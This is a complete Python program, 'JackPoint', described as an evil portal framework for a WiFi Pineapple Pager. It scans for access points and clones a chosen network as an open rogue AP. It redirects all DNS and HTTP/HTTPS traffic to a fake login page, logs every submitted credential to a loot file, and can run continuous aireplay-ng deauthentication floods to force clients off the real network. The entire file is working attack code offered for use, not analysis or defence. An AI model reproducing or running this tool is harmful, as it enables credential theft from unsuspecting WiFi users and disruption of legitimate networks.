#!/usr/bin/env python3
"""
JackPoint - Evil Portal Framework
WiFi Pineapple Pager // wickedNull

"Plug in. Ghost out. Leave nothing."
"""

import os
import sys
import time
import json
import signal
import socket
import struct
import argparse
import threading
import subprocess
from datetime import datetime
from http.server import HTTPServer, BaseHTTPRequestHandler
from urllib.parse import parse_qs, urlparse, unquote_plus

sys.path.insert(0, os.path.dirname(os.path.abspath(__file__)))
from pagerctl import Pager

# ---------------------------------------------------------------------------
# Colours
# ---------------------------------------------------------------------------
def rgb(r, g, b):
    return ((r & 0xF8) << 8) | ((g & 0xFC) << 3) | (b >> 3)

C_BG        = rgb(4,   4,  12)
C_TITLE     = rgb(0,  255, 180)   # cyan-green
C_SUBTITLE  = rgb(0,  180, 255)   # blue
C_WHITE     = rgb(220, 220, 220)
C_DIM       = rgb(80,  80,  80)
C_GREEN     = rgb(0,  255,  80)
C_RED       = rgb(255, 40,  40)
C_YELLOW    = rgb(255, 220,  0)
C_ORANGE    = rgb(255, 140,  0)
C_SEL_BG    = rgb(0,   60,  40)
C_WARN      = rgb(255, 100,  0)
C_CRED      = rgb(255, 220,  0)

SCREEN_W    = 480
SCREEN_H    = 222

# ---------------------------------------------------------------------------
# Argument parsing
# ---------------------------------------------------------------------------
def parse_args():
    p = argparse.ArgumentParser()
    p.add_argument('--ap-iface',      default='wlan0')
    p.add_argument('--deauth-iface',  default='wlan1mon')
    p.add_argument('--ap-ip',         default='192.168.4.1')
    p.add_argument('--ap-channel',    default='6')
    p.add_argument('--portal-dir',    required=True)
    p.add_argument('--loot-file',     required=True)
    p.add_argument('--cred-pipe',     required=True)
    p.add_argument('--hostapd-conf',  required=True)
    p.add_argument('--dnsmasq-conf',  required=True)
    p.add_argument('--nginx-conf',    required=True)
    p.add_argument('--active-portal', required=True)
    return p.parse_args()

# ---------------------------------------------------------------------------
# AP Scanner
# ---------------------------------------------------------------------------
def scan_aps(iface='wlan0mon'):
    """Return list of dicts: {ssid, bssid, channel, signal}"""
    aps = []
    try:
        # Use iw scan on the monitor interface
        out = subprocess.check_output(
            ['iw', 'dev', iface, 'scan', 'passive'],
            stderr=subprocess.DEVNULL, timeout=10
        ).decode('utf-8', errors='replace')
    except Exception:
        try:
            # Fallback: use wlan0 directly
            out = subprocess.check_output(
                ['iw', 'dev', 'wlan0', 'scan'],
                stderr=subprocess.DEVNULL, timeout=15
            ).decode('utf-8', errors='replace')
        except Exception:
            return aps

    current = {}
    for line in out.splitlines():
        line = line.strip()
        if line.startswith('BSS '):
            if current.get('ssid') and current.get('bssid'):
                aps.append(current)
            current = {'bssid': line.split()[1].split('(')[0].strip(),
                       'ssid': '', 'channel': '6', 'signal': -100}
        elif 'SSID:' in line:
            current['ssid'] = line.split('SSID:', 1)[1].strip()
        elif 'DS Parameter set: channel' in line:
            current['channel'] = line.split('channel', 1)[1].strip()
        elif 'signal:' in line:
            try:
                current['signal'] = float(line.split('signal:', 1)[1].split()[0])
            except Exception:
                pass
    if current.get('ssid') and current.get('bssid'):
        aps.append(current)

    # Sort by signal strength, filter empty SSIDs
    aps = [a for a in aps if a['ssid']]
    aps.sort(key=lambda x: x['signal'], reverse=True)
    return aps[:20]  # top 20

# ---------------------------------------------------------------------------
# Config generators
# ---------------------------------------------------------------------------
def write_hostapd_conf(path, iface, ssid, channel):
    conf = f"""interface={iface}
driver=nl80211
ssid={ssid}
hw_mode=g
channel={channel}
macaddr_acl=0
auth_algs=1
ignore_broadcast_ssid=0
wpa=0
"""
    with open(path, 'w') as f:
        f.write(conf)

def write_dnsmasq_conf(path, iface, ap_ip):
    subnet_start = ap_ip.rsplit('.', 1)[0] + '.10'
    subnet_end   = ap_ip.rsplit('.', 1)[0] + '.50'
    conf = f"""interface={iface}
bind-interfaces
dhcp-range={subnet_start},{subnet_end},12h
dhcp-option=3,{ap_ip}
dhcp-option=6,{ap_ip}
address=/#/{ap_ip}
log-queries=no
no-resolv
"""
    with open(path, 'w') as f:
        f.write(conf)

def write_nginx_conf(path, portal_path, ap_ip, cred_pipe):
    # nginx serves the portal HTML and proxies POST /creds to our Python server
    conf = f"""worker_processes 1;
pid /tmp/jackpoint_nginx.pid;
error_log /tmp/jackpoint_nginx_error.log;

events {{ worker_connections 64; }}

http {{
    access_log off;
    default_type text/html;

    server {{
        listen {ap_ip}:8080;

        # Captive portal detection endpoints → redirect to portal
        location ~ ^/(generate_204|hotspot-detect|ncsi.txt|connecttest.txt|redirect|success.txt) {{
            return 302 http://{ap_ip}:8080/;
        }}

        # Serve portal HTML
        location = / {{
            root /tmp/jackpoint_portal;
            index index.html;
        }}

        location /static/ {{
            root /tmp/jackpoint_portal;
        }}

        # Credential capture — POST from portal form
        location = /login {{
            proxy_pass http://127.0.0.1:9999/login;
            proxy_set_header X-Real-IP $remote_addr;
        }}

        location = /signin {{
            proxy_pass http://127.0.0.1:9999/login;
            proxy_set_header X-Real-IP $remote_addr;
        }}

        location = /submit {{
            proxy_pass http://127.0.0.1:9999/login;
            proxy_set_header X-Real-IP $remote_addr;
        }}

        # Catch-all POST → cred capture
        location / {{
            if ($request_method = POST) {{
                proxy_pass http://127.0.0.1:9999/login;
                proxy_set_header X-Real-IP $remote_addr;
            }}
            root /tmp/jackpoint_portal;
            index index.html;
            try_files $uri /index.html;
        }}
    }}
}}
"""
    with open(path, 'w') as f:
        f.write(conf)

# ---------------------------------------------------------------------------
# Credential capture HTTP server (port 9999)
# ---------------------------------------------------------------------------
class CredHandler(BaseHTTPRequestHandler):
    cred_callback = None

    def log_message(self, *args):
        pass  # suppress default logging

    def do_POST(self):
        try:
            length = int(self.headers.get('Content-Length', 0))
            body = self.rfile.read(length).decode('utf-8', errors='replace')
            fields = parse_qs(body)
            client_ip = self.headers.get('X-Real-IP', self.client_address[0])
            ua = self.headers.get('User-Agent', 'unknown')

            # Clean up field values
            clean = {}
            for k, v in fields.items():
                clean[k] = unquote_plus(v[0]) if v else ''

            if CredHandler.cred_callback and clean:
                CredHandler.cred_callback(clean, client_ip, ua)
        except Exception as e:
            print(f"CredHandler error: {e}", flush=True)

        # Always respond with a redirect back to portal (looks like failed login)
        self.send_response(302)
        self.send_header('Location', '/')
        self.end_headers()

    def do_GET(self):
        self.send_response(302)
        self.send_header('Location', '/')
        self.end_headers()

# ---------------------------------------------------------------------------
# Deauth thread
# ---------------------------------------------------------------------------
class DeauthThread(threading.Thread):
    def __init__(self, iface, bssid, channel):
        super().__init__(daemon=True)
        self.iface   = iface
        self.bssid   = bssid
        self.channel = channel
        self._stop   = threading.Event()

    def run(self):
        # Set channel on deauth interface
        try:
            subprocess.run(['iw', 'dev', self.iface, 'set', 'channel', str(self.channel)],
                           stderr=subprocess.DEVNULL)
        except Exception:
            pass

        while not self._stop.is_set():
            try:
                subprocess.run(
                    ['aireplay-ng', '--deauth', '5', '-a', self.bssid, self.iface],
                    stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL, timeout=8
                )
            except Exception:
                pass
            self._stop.wait(3)

    def stop(self):
        self._stop.set()

# ---------------------------------------------------------------------------
# Renderer
# ---------------------------------------------------------------------------
class Renderer:
    def __init__(self, p):
        self.p = p

    def clear(self, col=C_BG):
        self.p.fill_rect(0, 0, SCREEN_W, SCREEN_H, col)

    def header(self, title, subtitle=''):
        self.p.fill_rect(0, 0, SCREEN_W, 18, rgb(0, 30, 20))
        self.p.draw_text(4, 2, 'JACKPOINT', C_TITLE, 1)
        self.p.draw_text(80, 2, '//', C_DIM, 1)
        self.p.draw_text(96, 2, title, C_WHITE, 1)
        if subtitle:
            self.p.draw_text(SCREEN_W - len(subtitle)*6 - 4, 2, subtitle, C_DIM, 1)
        # divider
        self.p.fill_rect(0, 18, SCREEN_W, 1, C_TITLE)

    def footer(self, left='', right=''):
        self.p.fill_rect(0, SCREEN_H - 14, SCREEN_W, 14, rgb(0, 10, 8))
        self.p.fill_rect(0, SCREEN_H - 14, SCREEN_W, 1, C_DIM)
        if left:
            self.p.draw_text(4, SCREEN_H - 11, left, C_DIM, 1)
        if right:
            self.p.draw_text(SCREEN_W - len(right)*6 - 4, SCREEN_H - 11, right, C_DIM, 1)

    def scrollable_list(self, items, sel, top, y0, h, col_normal, col_sel, col_sel_bg):
        """Draw a scrollable list. items = list of strings."""
        row_h = 16
        visible = h // row_h
        for i in range(visible):
            idx = top + i
            if idx >= len(items):
                break
            y = y0 + i * row_h
            if idx == sel:
                self.p.fill_rect(2, y, SCREEN_W - 4, row_h - 1, col_sel_bg)
                self.p.draw_text(8, y + 3, items[idx][:58], col_sel, 1)
            else:
                self.p.draw_text(8, y + 3, items[idx][:58], col_normal, 1)

    def title_screen(self):
        self.clear()
        self.p.fill_rect(0, 0, SCREEN_W, SCREEN_H, C_BG)
        # ASCII banner
        lines = [
            " ░░ J A C K P O I N T ░░",
            "Evil Portal Framework",
            "WiFi Pineapple Pager",
        ]
        self.p.draw_text_centered(40, lines[0], C_TITLE, 1)
        self.p.draw_text_centered(60, lines[1], C_SUBTITLE, 1)
        self.p.draw_text_centered(74, lines[2], C_DIM, 1)
        self.p.fill_rect(40, 95, SCREEN_W - 80, 1, C_DIM)
        self.p.draw_text_centered(104, '"Plug in. Ghost out. Leave nothing."', C_DIM, 1)
        self.p.fill_rect(40, 120, SCREEN_W - 80, 1, C_DIM)
        self.p.draw_text_centered(140, 'GREEN = Jack In', C_GREEN, 1)
        self.p.draw_text_centered(156, 'RED   = Exit', C_RED, 1)
        self.p.flip()

# ---------------------------------------------------------------------------
# State machine screens
# ---------------------------------------------------------------------------
def screen_scan(p, r, args):
    """Scan for APs, return selected {ssid, channel} or None to exit."""
    r.clear()
    r.header('SCANNING')
    p.draw_text_centered(80, 'Scanning airspace...', C_DIM, 1)
    p.draw_text_centered(100, 'Please wait', C_DIM, 1)
    p.flip()

    aps = scan_aps('wlan0mon')

    # Add manual entry option at top
    options = ['[ ENTER CUSTOM SSID ]'] + [
        f"{a['ssid'][:30]}  ch{a['channel']}  {int(a['signal'])}dBm" for a in aps
    ]
    ap_data = [None] + aps  # parallel list

    sel = 0
    top = 0
    visible = (SCREEN_H - 34) // 16

    BTN_UP    = Pager.BTN_UP
    BTN_DOWN  = Pager.BTN_DOWN
    BTN_A     = Pager.BTN_A
    BTN_B     = Pager.BTN_B

    while True:
        r.clear()
        r.header('TARGET', f'{len(aps)} APs')
        r.scrollable_list(options, sel, top, 22, SCREEN_H - 36,
                          C_WHITE, C_GREEN, C_SEL_BG)
        r.footer('UP/DN=Select', 'A=Pick  B=Back')
        p.flip()

        try:
            _, pressed, _ = p.poll_input()
        except Exception:
            pressed = 0

        if pressed & BTN_UP:
            if sel > 0:
                sel -= 1
                if sel < top:
                    top = sel
        elif pressed & BTN_DOWN:
            if sel < len(options) - 1:
                sel += 1
                if sel >= top + visible:
                    top = sel - visible + 1
        elif pressed & BTN_A:
            if sel == 0:
                # Manual SSID entry — simple char cycle for now
                ssid = screen_text_entry(p, r, 'CUSTOM SSID')
                if ssid:
                    return {'ssid': ssid, 'channel': args.ap_channel, 'bssid': None}
            else:
                chosen = ap_data[sel]
                return {'ssid': chosen['ssid'],
                        'channel': chosen['channel'],
                        'bssid': chosen.get('bssid')}
        elif pressed & BTN_B:
            return None

        p.delay(80)


def screen_text_entry(p, r, prompt):
    """Very basic text entry using UP/DOWN to cycle chars, RIGHT to advance, A to confirm."""
    CHARS = ' abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ0123456789-_.'
    text  = []
    char_idx = 0

    BTN_UP    = Pager.BTN_UP
    BTN_DOWN  = Pager.BTN_DOWN
    BTN_LEFT  = Pager.BTN_LEFT
    BTN_RIGHT = Pager.BTN_RIGHT
    BTN_A     = Pager.BTN_A
    BTN_B     = Pager.BTN_B

    while True:
        current_char = CHARS[char_idx]
        display_text = ''.join(text) + '[' + current_char + ']'

        r.clear()
        r.header(prompt)
        p.draw_text(8, 30, 'UP/DN: cycle char', C_DIM, 1)
        p.draw_text(8, 44, 'RIGHT: accept char', C_DIM, 1)
        p.draw_text(8, 58, 'LEFT:  backspace', C_DIM, 1)
        p.draw_text(8, 72, 'A: confirm  B: cancel', C_DIM, 1)
        p.fill_rect(4, 100, SCREEN_W - 8, 20, rgb(0, 30, 20))
        p.draw_text(8, 104, display_text[:58], C_GREEN, 1)
        p.flip()

        try:
            _, pressed, _ = p.poll_input()
        except Exception:
            pressed = 0

        if pressed & BTN_UP:
            char_idx = (char_idx - 1) % len(CHARS)
        elif pressed & BTN_DOWN:
            char_idx = (char_idx + 1) % len(CHARS)
        elif pressed & BTN_RIGHT:
            if len(text) < 32:
                text.append(current_char)
                char_idx = 0
        elif pressed & BTN_LEFT:
            if text:
                text.pop()
        elif pressed & BTN_A:
            result = ''.join(text).strip()
            return result if result else None
        elif pressed & BTN_B:
            return None

        p.delay(80)


def screen_portal_pick(p, r, portal_dir):
    """Browse and select a portal HTML file. Returns path or None."""
    portals = sorted([
        f for f in os.listdir(portal_dir) if f.endswith('.html')
    ])

    if not portals:
        return None

    sel = 0
    top = 0
    visible = (SCREEN_H - 34) // 16

    BTN_UP  = Pager.BTN_UP
    BTN_DOWN = Pager.BTN_DOWN
    BTN_A   = Pager.BTN_A
    BTN_B   = Pager.BTN_B

    while True:
        r.clear()
        r.header('PORTAL', f'{len(portals)} loaded')
        r.scrollable_list(portals, sel, top, 22, SCREEN_H - 36,
                          C_WHITE, C_YELLOW, C_SEL_BG)
        r.footer('UP/DN=Select', 'A=Load  B=Back')
        p.flip()

        try:
            _, pressed, _ = p.poll_input()
        except Exception:
            pressed = 0

        if pressed & BTN_UP:
            if sel > 0:
                sel -= 1
                if sel < top:
                    top = sel
        elif pressed & BTN_DOWN:
            if sel < len(portals) - 1:
                sel += 1
                if sel >= top + visible:
                    top = sel - visible + 1
        elif pressed & BTN_A:
            return os.path.join(portal_dir, portals[sel])
        elif pressed & BTN_B:
            return None

        p.delay(80)


def screen_deauth_toggle(p, r, target):
    """Ask if user wants deauth on second radio. Returns True/False."""
    sel = 0  # 0=Yes 1=No

    BTN_LEFT  = Pager.BTN_LEFT
    BTN_RIGHT = Pager.BTN_RIGHT
    BTN_A     = Pager.BTN_A
    BTN_B     = Pager.BTN_B

    while True:
        r.clear()
        r.header('DEAUTH')
        p.draw_text_centered(30, 'Flood target AP?', C_WHITE, 1)
        p.draw_text_centered(48, f"SSID: {target['ssid'][:30]}", C_YELLOW, 1)
        p.draw_text_centered(64, 'Forces clients to your portal', C_DIM, 1)
        p.draw_text_centered(80, '(wlan1mon)', C_DIM, 1)

        yes_col = C_GREEN  if sel == 0 else C_DIM
        no_col  = C_RED    if sel == 1 else C_DIM
        yes_bg  = C_SEL_BG if sel == 0 else C_BG
        no_bg   = C_SEL_BG if sel == 1 else C_BG

        p.fill_rect(60,  120, 140, 22, yes_bg)
        p.fill_rect(280, 120, 140, 22, no_bg)
        p.draw_text_centered(126, 'YES', yes_col, 2)  # approximate left half
        p.draw_text(84,  125, 'YES', yes_col, 2)
        p.draw_text(304, 125, 'NO',  no_col,  2)

        r.footer('LEFT/RIGHT=Toggle', 'A=Confirm  B=Skip')
        p.flip()

        try:
            _, pressed, _ = p.poll_input()
        except Exception:
            pressed = 0

        if pressed & BTN_LEFT:
            sel = 0
        elif pressed & BTN_RIGHT:
            sel = 1
        elif pressed & BTN_A:
            return sel == 0
        elif pressed & BTN_B:
            return False

        p.delay(80)


def screen_live(p, r, args, target, portal_path, deauth_enabled,
                cred_list, cred_lock, stop_event):
    """
    Live view — shows AP status, client count, latest creds.
    B = teardown and return.
    """
    portal_name = os.path.basename(portal_path)
    BTN_B = Pager.BTN_B

    last_draw = 0

    while not stop_event.is_set():
        now = time.time()
        if now - last_draw < 0.2:
            p.delay(50)
            try:
                _, pressed, _ = p.poll_input()
                if pressed & BTN_B:
                    return
            except Exception:
                pass
            continue

        last_draw = now

        r.clear()
        r.header('LIVE', 'JACKPOINT ACTIVE')

        # Status bar
        p.fill_rect(0, 20, SCREEN_W, 28, rgb(0, 20, 14))
        p.draw_text(6,  24, 'AP:', C_DIM, 1)
        p.draw_text(30, 24, target['ssid'][:24], C_GREEN, 1)
        p.draw_text(6,  36, 'PORTAL:', C_DIM, 1)
        p.draw_text(56, 36, portal_name[:28], C_YELLOW, 1)

        deauth_str = 'DEAUTH:ON ' if deauth_enabled else 'DEAUTH:OFF'
        deauth_col = C_RED if deauth_enabled else C_DIM
        p.draw_text(SCREEN_W - 76, 24, deauth_str, deauth_col, 1)

        p.fill_rect(0, 48, SCREEN_W, 1, C_DIM)

        # Credential feed
        with cred_lock:
            recent = list(cred_list[-6:])  # last 6 captures

        if not recent:
            p.draw_text_centered(90, 'Waiting for connections...', C_DIM, 1)
            p.draw_text_centered(106, 'Portal is live', C_DIM, 1)
        else:
            p.draw_text(6, 52, f'CAPTURED: {len(cred_list)}', C_CRED, 1)
            y = 66
            for entry in reversed(recent[-4:]):
                ts   = entry.get('time', '')[-8:]   # HH:MM:SS
                ip   = entry.get('ip', '')
                # show first two fields
                fields = [(k, v) for k, v in entry.items()
                          if k not in ('time', 'ip', 'ua', 'portal', 'ssid')]
                line = f"[{ts}] {ip}"
                p.draw_text(6, y, line, C_DIM, 1)
                y += 12
                for k, v in fields[:2]:
                    p.draw_text(14, y, f"{k}: {v[:36]}", C_CRED, 1)
                    y += 12
                if y > SCREEN_H - 20:
                    break

        r.footer('', 'B=Teardown')
        p.flip()

        try:
            _, pressed, _ = p.poll_input()
            if pressed & BTN_B:
                return
        except Exception:
            pass

        p.delay(150)

# ---------------------------------------------------------------------------
# Service orchestration
# ---------------------------------------------------------------------------
def start_ap(args, target, portal_path):
    """Configure and start hostapd, dnsmasq, nginx. Returns pids dict."""
    ssid    = target['ssid']
    channel = target.get('channel', args.ap_channel)
    iface   = args.ap_iface
    ap_ip   = args.ap_ip

    # Write configs
    write_hostapd_conf(args.hostapd_conf, iface, ssid, channel)
    write_dnsmasq_conf(args.dnsmasq_conf, iface, ap_ip)
    write_nginx_conf(args.nginx_conf, portal_path, ap_ip, args.cred_pipe)

    # Copy portal to nginx serve dir
    os.makedirs('/tmp/jackpoint_portal', exist_ok=True)
    try:
        import shutil
        shutil.copy(portal_path, '/tmp/jackpoint_portal/index.html')
    except Exception as e:
        print(f"portal copy error: {e}", flush=True)

    # Write active portal name
    with open(args.active_portal, 'w') as f:
        f.write(os.path.basename(portal_path))

    # nftables for captive portal redirect
    subnet = ap_ip.rsplit('.', 1)[0] + '.0/24'
    subprocess.run(['nft', 'add', 'table', 'ip', 'jackpoint'], stderr=subprocess.DEVNULL)
    subprocess.run(['nft', 'add', 'chain', 'ip', 'jackpoint', 'prerouting',
                    '{', 'type', 'nat', 'hook', 'prerouting', 'priority', '-100', ';', '}'],
                   stderr=subprocess.DEVNULL)
    subprocess.run(['nft', 'add', 'chain', 'ip', 'jackpoint', 'postrouting',
                    '{', 'type', 'nat', 'hook', 'postrouting', 'priority', '100', ';', '}'],
                   stderr=subprocess.DEVNULL)
    subprocess.run(['nft', 'add', 'rule', 'ip', 'jackpoint', 'prerouting',
                    'iif', iface, 'tcp', 'dport', '80',
                    'dnat', 'to', f'{ap_ip}:8080'], stderr=subprocess.DEVNULL)
    subprocess.run(['nft', 'add', 'rule', 'ip', 'jackpoint', 'prerouting',
                    'iif', iface, 'tcp', 'dport', '443',
                    'dnat', 'to', f'{ap_ip}:8080'], stderr=subprocess.DEVNULL)
    subprocess.run(['nft', 'add', 'rule', 'ip', 'jackpoint', 'postrouting',
                    'ip', 'saddr', subnet, 'masquerade'], stderr=subprocess.DEVNULL)

    # Start hostapd
    hostapd = subprocess.Popen(
        ['hostapd', '-B', '-P', '/tmp/jackpoint_hostapd.pid', args.hostapd_conf],
        stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL
    )
    time.sleep(1)

    # Start dnsmasq
    dnsmasq = subprocess.Popen(
        ['dnsmasq', '--conf-file=' + args.dnsmasq_conf,
         '--pid-file=/tmp/jackpoint_dnsmasq.pid',
         '--no-daemon'],
        stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL
    )

    # Start nginx
    nginx = subprocess.Popen(
        ['nginx', '-c', args.nginx_conf],
        stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL
    )
    time.sleep(0.5)

    return {'hostapd': hostapd, 'dnsmasq': dnsmasq, 'nginx': nginx}


def stop_ap(procs):
    for name, proc in procs.items():
        try:
            proc.terminate()
            proc.wait(timeout=3)
        except Exception:
            try:
                proc.kill()
            except Exception:
                pass

# ---------------------------------------------------------------------------
# Main
# ---------------------------------------------------------------------------
def run():
    args = parse_args()

    cred_list  = []
    cred_lock  = threading.Lock()
    stop_event = threading.Event()
    deauth_thread = None
    cred_server   = None
    ap_procs      = {}

    def on_creds(fields, client_ip, ua):
        """Called from HTTP server thread when creds arrive."""
        portal = ''
        try:
            with open(args.active_portal) as f:
                portal = f.read().strip()
        except Exception:
            pass

        entry = dict(fields)
        entry['time']   = datetime.now().strftime('%Y-%m-%d %H:%M:%S')
        entry['ip']     = client_ip
        entry['ua']     = ua
        entry['portal'] = portal

        with cred_lock:
            cred_list.append(entry)

        # Write to loot file
        try:
            os.makedirs(os.path.dirname(args.loot_file), exist_ok=True)
            with open(args.loot_file, 'a') as f:
                f.write(f"\n[{entry['time']}] PORTAL: {portal}\n")
                f.write(f"  client_ip : {client_ip}\n")
                for k, v in fields.items():
                    f.write(f"  {k:<12}: {v}\n")
                f.write(f"  useragent : {ua}\n")
        except Exception as e:
            print(f"loot write error: {e}", flush=True)

    CredHandler.cred_callback = on_creds

    with Pager() as p:
        p.set_rotation(270)
        r = Renderer(p)

        # Title screen
        r.title_screen()

        BTN_A = Pager.BTN_A
        BTN_B = Pager.BTN_B

        while True:
            try:
                _, pressed, _ = p.poll_input()
            except Exception:
                pressed = 0
            if pressed & BTN_A:
                break
            if pressed & BTN_B:
                return
            p.delay(80)

        # --- SCAN ---
        target = screen_scan(p, r, args)
        if not target:
            return

        # --- PORTAL PICK ---
        portal_path = screen_portal_pick(p, r, args.portal_dir)
        if not portal_path:
            return

        # --- DEAUTH TOGGLE ---
        deauth_enabled = False
        if target.get('bssid'):
            deauth_enabled = screen_deauth_toggle(p, r, target)

        # --- GOING HOT ---
        r.clear()
        r.header('GOING HOT')
        p.draw_text_centered(60,  'Spinning up rogue AP...', C_YELLOW, 1)
        p.draw_text_centered(78,  target['ssid'], C_GREEN, 1)
        p.draw_text_centered(96,  os.path.basename(portal_path), C_WHITE, 1)
        p.flip()

        try:
            ap_procs = start_ap(args, target, portal_path)
        except Exception as e:
            print(f"start_ap error: {e}", flush=True)
            r.clear()
            r.header('ERROR')
            p.draw_text_centered(80, 'AP failed to start', C_RED, 1)
            p.draw_text_centered(96, str(e)[:50], C_DIM, 1)
            p.flip()
            p.delay(3000)
            return

        # Start credential capture server
        try:
            cred_server = HTTPServer(('127.0.0.1', 9999), CredHandler)
            cred_thread = threading.Thread(target=cred_server.serve_forever, daemon=True)
            cred_thread.start()
        except Exception as e:
            print(f"cred server error: {e}", flush=True)

        # Start deauth if requested
        if deauth_enabled and target.get('bssid'):
            deauth_thread = DeauthThread(
                args.deauth_iface,
                target['bssid'],
                target.get('channel', args.ap_channel)
            )
            deauth_thread.start()

        # --- LIVE VIEW ---
        try:
            screen_live(p, r, args, target,
                        portal_path, deauth_enabled,
                        cred_list, cred_lock, stop_event)
        except Exception as e:
            print(f"screen_live error: {e}", flush=True)

        # --- TEARDOWN ---
        r.clear()
        r.header('TEARDOWN')
        p.draw_text_centered(80, 'Pulling the plug...', C_DIM, 1)
        p.draw_text_centered(96, f'Captured: {len(cred_list)} credentials', C_CRED, 1)
        p.flip()

        stop_event.set()

        if deauth_thread:
            deauth_thread.stop()
            deauth_thread.join(timeout=3)

        if cred_server:
            cred_server.shutdown()

        stop_ap(ap_procs)

        p.delay(1500)


if __name__ == '__main__':
    try:
        run()
    except KeyboardInterrupt:
        pass
    except Exception as e:
        print(f"FATAL: {e}", flush=True)
        import traceback
        traceback.print_exc()
        sys.exit(1)
